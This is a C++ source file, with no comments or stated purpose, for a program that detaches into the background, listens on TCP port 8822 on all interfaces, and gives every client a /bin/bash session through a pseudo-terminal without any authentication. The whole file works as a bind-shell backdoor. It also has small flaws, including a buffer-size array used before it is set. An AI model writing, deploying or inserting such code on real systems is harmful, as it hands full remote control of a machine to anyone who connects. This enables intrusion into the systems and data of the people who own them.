#include<sys/socket.h>
#include<fcntl.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<sys/types.h>
#include<netdb.h>
#include<unistd.h>
#include<iostream>
#include<pty.h>
#include<utmp.h>
#include<poll.h>

void write_(int fd, char* buffer, size_t sz) {
    size_t counter = 0;
    while (counter < sz) {
        int write_counter = write(fd, buffer + counter, sz - counter);
        if (write_counter < 0)
            return;
        counter += write_counter;
    }
}
int main () {
if (fork() == 0) {
    setsid();
    struct addrinfo hints;
    struct addrinfo *result;
    int sfd, s;
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    hints.ai_protocol = 0;
    s = getaddrinfo(NULL, "8822", &hints, &result);
    if (s != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
        exit(EXIT_FAILURE);
    }
    struct addrinfo *rp;
    for (rp  = result; rp != NULL; rp = rp->ai_next) {
        sfd = socket(rp->ai_family, rp->ai_socktype,
                rp->ai_protocol);
        if (sfd == -1)
            continue;
        if (bind(sfd, rp->ai_addr, rp->ai_addrlen) == 0)
            break;
        close(sfd);
    }
    if (rp == NULL) {
        std::cerr << "Could not bind" << std::endl;
        exit(EXIT_FAILURE);
    }
    freeaddrinfo(result);
    int opt = 1;
    if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &opt,
                sizeof(int)) != 0) {
        std::cerr << "Could not set socket optins" << std::endl;
        exit(EXIT_FAILURE);
    }
    if (listen(sfd, 10) != 0) {
        std::cerr << "Could not listen" << std::endl;
        exit(EXIT_FAILURE);
    }
    int sockfd;
    while (1) {
        sockaddr saddr;
        socklen_t addrlen = sizeof(saddr);
        sockfd = accept(sfd, &saddr, &addrlen);
        if (sockfd == -1) {
            std::cerr << "Could not accept " << sockfd << std::endl;
            exit(EXIT_FAILURE);
        }
        pid_t fork_val = fork();
        if (fork_val) {// parent
            close(sockfd);
        } else {// child
            close(0);
            close(1);
            close(2);
            int master, slave;
            char buf[4096];
            openpty(&master, &slave, buf, NULL, NULL);
            if (fork()) {
                close(slave);
                char buffer[2][4096];
                struct pollfd pfd[2];
                int read_count[2];
                int b_size[2];
                bool b_end = false;
                pfd[0].fd = master;
                pfd[0].events = POLLIN | POLLHUP | POLLERR;
                pfd[1].fd = sockfd;
                pfd[1].events = POLLIN | POLLHUP | POLLERR;
                while(true) {
                    int poll_val = poll(pfd, 2, -1);
                    if (poll_val > 0) {
                        for(int i = 0; i < 2; i++) {
                            int j = (i + 1) % 2;
                            if (pfd[i].revents & POLLIN) {
                                read_count[i] = read(pfd[i].fd,
                                        buffer[i], 4096);
                                if (read_count[i] == 0) {
                                    close(pfd[i].fd);
                                    b_end = true;
                                }
                                if (read_count[i] < 0) {
                                    close(pfd[i].fd);
                                    printf("11111");
                                    exit(1);
                                } else {
                                    b_size[i] += read_count[i];
                                }
                            }
                            if (pfd[j].revents & POLLOUT) {
                                int write_count = write(pfd[j].fd,
                                        buffer[i], b_size[i]);
                                b_size[i] -= write_count;
                                if (write_count < 0) {
                                   exit(1);
                                }
                            }
                            if (b_size[i] > 0)
                                pfd[j].events = pfd[j].events | POLLOUT;
                            else {
                                if (pfd[j].events & POLLOUT) {
                                    pfd[j].events ^= POLLOUT;
                                    if (b_end) {
                                        close(pfd[j].fd);
                                        exit(1);
                                    }
                                }
                            }
                        }
                        for (int i = 0; i < 2; i++) {
                            if (pfd[i].revents & (POLLERR | POLLHUP)) {
                                close(pfd[i].fd);
                                exit(1);
                            }
                        }
                    } else
                        break;
                }
                close(master);
                close(sockfd);
            } else {
                close(master);
                close(sockfd);
                int ft = open(buf, O_RDWR);
                close(ft);
                setsid();
                dup2(slave, 0);
                dup2(slave, 1);
                dup2(slave, 2);
                execl("/bin/bash","bash", NULL);
            }
        }
    }
}
return 0; 
}
